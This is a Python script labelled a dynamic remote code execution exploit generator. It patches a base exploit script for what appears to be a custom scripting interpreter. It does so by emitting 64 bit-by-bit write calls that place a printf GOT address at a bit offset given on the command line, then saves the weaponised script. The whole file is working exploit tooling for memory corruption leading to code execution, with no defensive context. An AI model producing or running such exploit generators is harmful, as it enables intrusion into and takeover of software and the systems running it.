#!/usr/bin/env python3
"""
Dynamic RCE exploit generator
Reads the base script and replaces the write code with correct bit_index
"""

import sys
import re

def generate_write_code(bit_index, value):
    """Generate set() calls for writing a 64-bit value"""
    code = []
    for bit in range(64):
        x = bit_index + bit
        y = 0
        bit_value = (value >> bit) & 1
        code.append(f"set(b1, {x}, {y}, {bit_value});")
    return "\n".join(code)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 rce_exploit_dynamic_generator.py <bit_index>")
        print("Example: python3 rce_exploit_dynamic_generator.py 35648")
        sys.exit(1)
    
    bit_index = int(sys.argv[1])
    printf_got = 0x409048
    
    # Read base script
    with open('rce_exploit_final_working.bs', 'r') as f:
        script = f.read()
    
    # Find the write section
    start_marker = 'print("Writing 64 bits starting at calculated bit_index...");'
    end_marker = 'print("Write completed");'
    
    start_idx = script.find(start_marker)
    end_idx = script.find(end_marker)
    
    if start_idx == -1 or end_idx == -1:
        print("Error: Could not find write section")
        sys.exit(1)
    
    # Generate new write code
    write_code = generate_write_code(bit_index, printf_got)
    
    # Replace the section
    before = script[:start_idx + len(start_marker)]
    after = script[end_idx:]
    
    new_script = before + "\n" + write_code + "\n" + after
    
    # Write to new file
    output_file = f'rce_exploit_bitindex_{bit_index}.bs'
    with open(output_file, 'w') as f:
        f.write(new_script)
    
    print(f"Generated: {output_file}")
    print(f"With bit_index: {bit_index}")

if __name__ == "__main__":
    main()

